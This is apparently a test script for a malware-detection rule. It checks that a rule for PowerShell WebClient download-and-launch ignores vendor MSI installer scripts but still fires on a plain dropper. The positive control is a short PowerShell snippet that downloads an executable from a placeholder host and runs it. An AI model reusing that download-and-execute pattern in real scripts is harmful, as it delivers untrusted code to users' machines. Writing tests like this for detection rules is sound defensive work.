"""Vendor MSI installers are not WebClient droppers.

Run: python3 testdata/powershell-msiexec-installer-context/verify.py <scratch-directory>

`powershell-webclient-remote-exe-launch` fires when WebClient downloads an
executable and Start-Process launches it. Vendor MSI install scripts match
that shape incidentally: they fetch an MSI and invoke msiexec (including
prior-version uninstall cleanup via Start-Process). That is installer flow,
not a stealth payload launch, so the rule excludes the msiexec context (the
iwr sibling already does). The positive control proves the exclusion is
narrow: without msiexec the hostile still fires.
"""
import json
import os
from pathlib import Path
import subprocess
import sys

ROOT = Path(__file__).resolve().parents[2]
TARGET = ('objectives/command-and-control/dropper/file-exec/spawn::'
          'powershell-webclient-remote-exe-launch')

NEGATIVE = """\
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://downloads.example.com/installer/Example.msi", "$env:TEMP\\Example.msi")
$uninstallIds = Find-UninstallGuids -Match "Example"
foreach ($uninstallId in $uninstallIds) {
  Start-Process msiexec.exe -ArgumentList "/x $uninstallId /qn"
}
msiexec.exe /qn /i $env:TEMP\\Example.msi
"""

POSITIVE = """\
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://downloads.example.com/installer/Example.exe", "$env:TEMP\\Example.exe")
Start-Process "$env:TEMP\\Example.exe"
"""


def main():
    dest = Path(sys.argv[1])
    dest.mkdir(parents=True, exist_ok=True)
    cases = {
        'msi-installer-negative.ps1': (NEGATIVE, False),
        'plain-dropper-positive.ps1': (POSITIVE, True),
    }
    for name, (body, hostile) in cases.items():
        path = dest / name
        path.write_text(body)
        result = subprocess.run(
            [os.environ.get('CLEAVE', 'cleave'), '--traits-dir', str(ROOT),
             '--format', 'json', str(path)],
            env=dict(os.environ, CLEAVE_VALIDATE='0'),
            text=True, capture_output=True, check=True)
        report = json.loads(result.stdout)
        ids = {t['id'] for entry in report['files'] for t in entry['traits']}
        assert (TARGET in ids) == hostile, (name, sorted(ids))
        print('PASS', name, flush=True)


if __name__ == '__main__':
    main()
